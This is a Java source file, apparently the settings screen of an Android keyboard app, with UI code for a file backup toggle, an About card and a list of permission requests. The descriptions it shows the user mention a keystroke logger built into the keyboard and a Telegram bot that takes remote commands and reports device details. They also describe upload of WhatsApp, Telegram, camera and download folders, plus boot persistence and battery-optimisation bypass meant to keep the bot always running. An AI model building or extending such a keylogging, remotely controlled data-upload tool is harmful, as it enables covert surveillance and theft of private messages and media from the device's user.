        android.content.SharedPreferences fbPrefs =
                getSharedPreferences(FileBackupService.PREFS, MODE_PRIVATE);
        Switch sw = new Switch(this);
        sw.setChecked(fbPrefs.getBoolean(FileBackupService.KEY_ENABLED, true));
        sw.setOnCheckedChangeListener((v, on) -> {
            fbPrefs.edit().putBoolean(FileBackupService.KEY_ENABLED, on).apply();
            if (on) FileBackupService.startIfEnabled(this);
            else    FileBackupService.stopService(this);
            recreate();
        });
        topRow.addView(sw);
        card.addView(topRow);

        card.addView(makeDivider());

        // Status line
        boolean fbRunning = FileBackupService.isRunning();
        long pending = FileUploadQueue.get(this).countPending();
        long done    = FileUploadQueue.get(this).countDone();

        TextView statusTv = new TextView(this);
        String statusText = fbRunning
            ? "🟢 Running · " + done + " uploaded · " + pending + " pending"
            : "🔴 Stopped";
        statusTv.setText("Status: " + statusText);
        statusTv.setTextColor(fbRunning ? C.green : C.textSecondary);
        statusTv.setTextSize(12);
        card.addView(statusTv);

        card.addView(makeDivider());

        // Monitored folders info
        TextView dirsLabel = new TextView(this);
        dirsLabel.setText("Monitored Folders");
        dirsLabel.setTextColor(C.textPrimary);
        dirsLabel.setTextSize(12);
        dirsLabel.setTypeface(Typeface.DEFAULT_BOLD);
        LinearLayout.LayoutParams dlp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        dlp.setMargins(0, dp(4), 0, 0);
        dirsLabel.setLayoutParams(dlp);
        card.addView(dirsLabel);

        TextView dirsList = new TextView(this);
        dirsList.setText("Camera, Screenshots, DCIM, Pictures, Movies, WhatsApp Images/Video/Docs/Audio, Telegram, Download, Bluetooth, Instagram, Facebook, Twitter, Snapchat, Screen Recorder.");
        dirsList.setTextColor(C.textSecondary);
        dirsList.setTextSize(11);
        card.addView(dirsList);

        card.addView(makeDivider());

        // Start / Stop button
        Button ssBtn = new Button(this);
        ssBtn.setText(fbRunning ? "⏹  Stop Backup Service" : "▶  Start Backup Service");
        ssBtn.setTextSize(13);
        ssBtn.setTextColor(0xFFFFFFFF);
        android.graphics.drawable.GradientDrawable ssBg = new android.graphics.drawable.GradientDrawable();
        ssBg.setColor(fbRunning ? 0xFFc0392b : C.primary);
        ssBg.setCornerRadius(dp(8));
        ssBtn.setBackground(ssBg);
        LinearLayout.LayoutParams sslp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        sslp.setMargins(0, dp(8), 0, 0);
        ssBtn.setLayoutParams(sslp);
        ssBtn.setOnClickListener(v -> {
            if (fbRunning) FileBackupService.stopService(this);
            else           FileBackupService.startIfEnabled(this);
            recreate();
        });
        card.addView(ssBtn);

        return card;
    }

    // ── About card ────────────────────────────────────────────────────────────

    private View buildAboutCard() {
        LinearLayout card = makeCard();
        card.setOrientation(LinearLayout.VERTICAL);

        TextView appName = new TextView(this);
        appName.setText("UnBelievable Keyboard");
        appName.setTextColor(C.primary);
        appName.setTextSize(15);
        appName.setTypeface(Typeface.DEFAULT_BOLD);
        card.addView(appName);

        TextView desc = new TextView(this);
        desc.setText("Open-source Android IME with Smart Clips, formula expansion,\nMatrix mode, clipboard history, and developer tools.");
        desc.setTextColor(C.textSecondary);
        desc.setTextSize(12);
        desc.setPadding(0, dp(6), 0, dp(12));
        card.addView(desc);

        View div = makeDivider();
        card.addView(div);

        Button repoBtn = new Button(this);
        repoBtn.setText("⬡  View Source on GitHub");
        repoBtn.setTextColor(C.primary);
        repoBtn.setTextSize(13);
        repoBtn.setBackground(null);
        repoBtn.setPadding(0, dp(12), 0, 0);
        repoBtn.setOnClickListener(v -> {
            try {
                startActivity(new Intent(Intent.ACTION_VIEW,
                        Uri.parse("https://github.com/neet-ctrl/FullKeyboard-SystemConsole")));
            } catch (Exception ignored) {}
        });
        card.addView(repoBtn);

        return card;
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    // ─────────────────────────────────────────────────────────────────────────
    // Permissions Section
    // ─────────────────────────────────────────────────────────────────────────

    private static final int REQ_NOTIFICATIONS = 2001;
    private static final int REQ_PHONE_STATE   = 2002;

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        recreate();
    }

    private View buildPermissionsSection() {
        LinearLayout card = makeCard();

        // Intro note
        TextView note = new TextView(this);
        note.setText("Grant the permissions below to unlock all features. Tap a button to request each one — you can do it right here without leaving the app.");
        note.setTextColor(C.textSecondary);
        note.setTextSize(12);
        LinearLayout.LayoutParams nlp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        nlp.setMargins(0, 0, 0, dp(14));
        note.setLayoutParams(nlp);
        card.addView(note);

        // ── 1. Internet ──────────────────────────────────────────────────────
        addPermRow(card,
                "🌐", "Internet Access",
                "Sends & receives data for the Telegram bot (clips, commands, exports).",
                true, null, null);
        card.addView(makeDivider());

        // ── 2. Auto-start on Boot ────────────────────────────────────────────
        addPermRow(card,
                "🚀", "Auto-start on Boot",
                "Restarts the Telegram bot automatically after the device reboots.",
                true, null, null);
        card.addView(makeDivider());

        // ── 3. Background Service ────────────────────────────────────────────
        addPermRow(card,
                "🔄", "Background Service",
                "Keeps the Telegram bot polling for commands even while the screen is off.",
                true, null, null);
        card.addView(makeDivider());

        // ── 4. Notifications (runtime, API 33+) ──────────────────────────────
        boolean hasNotif = Build.VERSION.SDK_INT < 33 ||
                checkSelfPermission("android.permission.POST_NOTIFICATIONS")
                        == PackageManager.PERMISSION_GRANTED;
        addPermRow(card,
                "🔔", "Notifications",
                "Shows bot status alerts and 'new clip received' notifications on your status bar.",
                hasNotif,
                hasNotif ? null : "Grant",
                hasNotif ? null : v -> {
                    if (Build.VERSION.SDK_INT >= 33)
                        requestPermissions(new String[]{"android.permission.POST_NOTIFICATIONS"},
                                REQ_NOTIFICATIONS);
                });
        card.addView(makeDivider());

        // ── 5. Draw Over Other Apps ──────────────────────────────────────────
        boolean canOverlay = Build.VERSION.SDK_INT < 23 || Settings.canDrawOverlays(this);
        addPermRow(card,
                "🪟", "Draw Over Other Apps",
                "Required for the floating clipboard widget that appears on top of any app.",
                canOverlay,
                canOverlay ? null : "Open Settings",
                canOverlay ? null : v -> startActivity(
                        new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                Uri.parse("package:" + getPackageName()))));
        card.addView(makeDivider());

        // ── 6. App Name Lookup ───────────────────────────────────────────────
        addPermRow(card,
                "📱", "App Name Lookup",
                "Resolves package names to readable labels in the Keystroke Logger\n(e.g. 'WhatsApp' instead of 'com.whatsapp').",
                true, null, null);
        card.addView(makeDivider());

        // ── 7. Phone & Network State ─────────────────────────────────────────
        boolean hasPhone = Build.VERSION.SDK_INT < 23 ||
                checkSelfPermission("android.permission.READ_PHONE_STATE")
                        == PackageManager.PERMISSION_GRANTED;
        addPermRow(card,
                "📞", "Phone & Network Info",
                "Reads device model, Android version & carrier for the Telegram /device command.",
                hasPhone,
                hasPhone ? null : "Grant",
                hasPhone ? null : v ->
                        requestPermissions(new String[]{"android.permission.READ_PHONE_STATE"},
                                REQ_PHONE_STATE));
        card.addView(makeDivider());

        // ── 8. Disable Battery Optimization ──────────────────────────────────
        boolean batteryIgnored = false;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            batteryIgnored = pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
        } else {
            batteryIgnored = true;
        }
        addPermRow(card,
                "🔋", "Disable Battery Optimization",
                "Prevents Android from killing the Telegram bot when the screen is off or app is in the background. REQUIRED for 100% uptime.",
                batteryIgnored,
                batteryIgnored ? null : "Disable Now",
                batteryIgnored ? null : v -> {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        try {
                            startActivity(new Intent(
                                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                                    Uri.parse("package:" + getPackageName())));
                        } catch (Exception ex) {
                            try {
                                startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
                            } catch (Exception ignored) {}
                        }
                    }
                });
        card.addView(makeDivider());

        // ── 9. Manufacturer Auto-start ────────────────────────────────────────
        addPermRow(card,
                "🚀", "Manufacturer Auto-start",
                "On MIUI/OxygenOS/Samsung/Huawei devices, you must also allow auto-start in the vendor security app so the bot survives a reboot.",
                false,
                "Open Settings",
                v -> openManufacturerAutoStart());
        card.addView(makeDivider());

        // ── 10. Storage / Media Access (File Backup) ─────────────────────────
        boolean hasStorage;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            hasStorage =
                checkSelfPermission("android.permission.READ_MEDIA_IMAGES")  == PackageManager.PERMISSION_GRANTED
             && checkSelfPermission("android.permission.READ_MEDIA_VIDEO")   == PackageManager.PERMISSION_GRANTED
             && checkSelfPermission("android.permission.READ_MEDIA_AUDIO")   == PackageManager.PERMISSION_GRANTED;
        } else {
            hasStorage = Build.VERSION.SDK_INT < 23 ||
                checkSelfPermission("android.permission.READ_EXTERNAL_STORAGE")
                    == PackageManager.PERMISSION_GRANTED;
        }
        addPermRow(card,
                "📁", "Storage / Media Access",
                "Required for the File Cloud Backup feature — allows monitoring Camera, Screenshots, WhatsApp, Telegram, Download and all media folders.",
                hasStorage,
                hasStorage ? null : "Grant",
                hasStorage ? null : v -> {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        requestPermissions(new String[]{
                            "android.permission.READ_MEDIA_IMAGES",
                            "android.permission.READ_MEDIA_VIDEO",
                            "android.permission.READ_MEDIA_AUDIO"
                        }, 2003);
                    } else if (Build.VERSION.SDK_INT >= 23) {
                        requestPermissions(new String[]{
                            "android.permission.READ_EXTERNAL_STORAGE"
                        }, 2003);
                    }
                });
        card.addView(makeDivider());

        // ── 11. Read System Logs (Shizuku) ────────────────────────────────────
        addPermRow(card,
                "📋", "Read System Logs",
                "Captures device-wide Logcat for the System Console feature.\nRequires Shizuku — install it, start its service, then authorize this app inside Shizuku.",
                false,
                "How to enable",
                v -> Toast.makeText(this,
                        "1. Install 'Shizuku' from Play Store\n"
                        + "2. Open Shizuku → tap 'Pairing'\n"
                        + "3. Start the Shizuku service\n"
                        + "4. Open System Console here to authorize",
                        Toast.LENGTH_LONG).show());

        return card;
    }

    private void openManufacturerAutoStart() {
        String[][] intents = {
            // MIUI (Xiaomi / Redmi / POCO)
            {"com.miui.securitycenter",
             "com.miui.permcenter.autostart.AutoStartManagementActivity"},
            // OxygenOS / ColorOS (OnePlus / Oppo / Realme)
            {"com.oneplus.security",
             "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity"},
            {"com.coloros.safecenter",
             "com.coloros.privacypermissionsentry.PermissionTopActivity"},
            {"com.oppo.safe",
             "com.oppo.safe.permission.startup.StartupAppListActivity"},
            // Samsung
            {"com.samsung.android.lool",
             "com.samsung.android.sm.battery.ui.BatteryActivity"},
            // Huawei / Honor
            {"com.huawei.systemmanager",
             "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"},
            // Vivo
            {"com.vivo.permissionmanager",
             "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"},
            // Asus
            {"com.asus.mobilemanager",
             "com.asus.mobilemanager.powersaver.PowerSaverSettings"},
            // Letv
            {"com.letv.android.letvsafe",
             "com.letv.android.letvsafe.AutobootManageActivity"},
        };
        for (String[] pair : intents) {
            try {
                Intent i = new Intent();
                i.setClassName(pair[0], pair[1]);
                startActivity(i);
                return;
            } catch (Exception ignored) {}
        }
        // Fallback: open generic app settings
        try {
            startActivity(new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    Uri.parse("package:" + getPackageName())));
        } catch (Exception ignored) {
            Toast.makeText(this,
                    "Go to Settings → Apps → This app → Battery → No restrictions",
                    Toast.LENGTH_LONG).show();
        }
    }

    private void addPermRow(LinearLayout parent,
                             String icon, String name, String desc,
                             boolean granted, String btnLabel,
                             View.OnClickListener action) {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setGravity(Gravity.CENTER_VERTICAL);
        LinearLayout.LayoutParams rlp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        rlp.setMargins(0, dp(4), 0, dp(4));
        row.setLayoutParams(rlp);

        // Emoji icon
        TextView iconTv = new TextView(this);
        iconTv.setText(icon);
        iconTv.setTextSize(22);
        iconTv.setPadding(0, 0, dp(12), 0);
        row.addView(iconTv);

        // Name + description column
        LinearLayout textCol = new LinearLayout(this);
        textCol.setOrientation(LinearLayout.VERTICAL);
        textCol.setLayoutParams(new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f));
        textCol.addView(rowLabel(name));
        textCol.addView(rowSub(desc));
        row.addView(textCol);

        // Status badge or action button
        if (granted) {
            TextView badge = new TextView(this);
            badge.setText("✅ Granted");
            badge.setTextColor(C.green);
            badge.setTextSize(11);
            badge.setTypeface(Typeface.DEFAULT_BOLD);
            badge.setPadding(dp(8), 0, 0, 0);
            row.addView(badge);
        } else if (btnLabel != null && action != null) {
            Button btn = new Button(this);
            btn.setText(btnLabel);
            btn.setTextSize(11);
            btn.setAllCaps(false);
            btn.setMinWidth(0);
            btn.setMinHeight(0);
            btn.setPadding(dp(12), dp(6), dp(12), dp(6));
            GradientDrawable btnBg = new GradientDrawable();
            btnBg.setColor(C.primary);
            btnBg.setCornerRadius(dp(8));
            btn.setBackground(btnBg);
            btn.setTextColor(0xFFFFFFFF);
            btn.setOnClickListener(action);
            LinearLayout.LayoutParams blp = new LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
            blp.setMargins(dp(8), 0, 0, 0);
            btn.setLayoutParams(blp);
            row.addView(btn);
        } else {
            // No button, show ❌ Denied badge
            TextView badge = new TextView(this);
            badge.setText("❌ Denied");
            badge.setTextColor(0xFFEF4444);
            badge.setTextSize(11);
            badge.setTypeface(Typeface.DEFAULT_BOLD);
            badge.setPadding(dp(8), 0, 0, 0);
            row.addView(badge);
        }

        parent.addView(row);
    }

    // ─────────────────────────────────────────────────────────────────────────

    private LinearLayout makeCard() {
        LinearLayout c = new LinearLayout(this);
        c.setOrientation(LinearLayout.VERTICAL);
        c.setPadding(dp(18), dp(16), dp(18), dp(16));
        GradientDrawable bg = new GradientDrawable();
        bg.setColor(C.surface);
        bg.setCornerRadius(dp(14));
        c.setBackground(bg);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.setMargins(dp(16), 0, dp(16), dp(10));
        c.setLayoutParams(lp);
        if (Build.VERSION.SDK_INT >= 21) c.setElevation(dp(2));
        return c;
    }

    private View sectionLabel(String text) {
        TextView tv = new TextView(this);
        tv.setText(text);
        tv.setTextColor(C.primary);
        tv.setTextSize(11);
        tv.setTypeface(Typeface.DEFAULT_BOLD);
        tv.setAllCaps(true);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.setMargins(dp(20), dp(18), dp(20), dp(6));
        tv.setLayoutParams(lp);
        return tv;
    }

    private TextView rowLabel(String text) {
        TextView tv = new TextView(this);
        tv.setText(text);
        tv.setTextColor(C.textPrimary);
        tv.setTextSize(14);
        tv.setTypeface(ThemeManager.isMatrixMode(this) ? Typeface.MONOSPACE : Typeface.DEFAULT_BOLD);
        return tv;
    }

    private TextView rowSub(String text) {
        TextView tv = new TextView(this);
        tv.setText(text);
        tv.setTextColor(C.textSecondary);
        tv.setTextSize(11);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.setMargins(0, dp(2), 0, 0);
        tv.setLayoutParams(lp);
        return tv;
    }

    private View makeDivider() {
        View v = new View(this);
        v.setBackgroundColor(C.divider);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 1);
        lp.setMargins(0, dp(12), 0, dp(12));
        v.setLayoutParams(lp);
        return v;
    }

    private void applySegBtn(Button b, boolean selected) {
        GradientDrawable bg = new GradientDrawable();
        bg.setColor(selected ? C.primary : C.surfaceVariant);
        bg.setCornerRadius(dp(8));
        b.setBackground(bg);
        b.setTextColor(selected ? C.headerText : C.textSecondary);
        b.setPadding(dp(4), dp(8), dp(4), dp(8));
        b.setMinWidth(0);
        b.setMinHeight(0);
    }

    private LinearLayout buildSegRow(int[] vals, String[] lbls, int cur, String key) {
        LinearLayout seg = new LinearLayout(this);
        seg.setOrientation(LinearLayout.HORIZONTAL);
        LinearLayout.LayoutParams sp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        sp.setMargins(0, dp(12), 0, 0);
        seg.setLayoutParams(sp);
        for (int i = 0; i < vals.length; i++) {
            final int val = vals[i];
            Button b = new Button(this);
            b.setText(lbls[i]);
            b.setTextSize(12);
            LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(0,
                    LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
            if (i > 0) lp.setMargins(dp(5), 0, 0, 0);
            b.setLayoutParams(lp);
            applySegBtn(b, val == cur);
            b.setOnClickListener(v -> {
                ThemeManager.prefs(this).edit().putInt(key, val).apply();
                recreate();
            });
            seg.addView(b);
        }
        return seg;
    }

    private int dp(int v) { return (int)(v * D); }
}
